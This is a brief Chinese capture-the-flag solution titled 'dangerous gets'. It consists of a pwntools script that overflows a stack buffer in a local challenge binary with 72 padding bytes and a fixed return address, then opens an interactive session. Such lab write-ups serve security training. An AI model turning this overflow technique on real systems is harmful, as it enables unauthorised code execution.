# 危险的gets

## **解题脚本**

```python
from pwn import *

p = process("./pwn")

payload = b'a'*(64 + 8) + p64(0x40117E)
p.sendline(payload)

p.interactive()
```

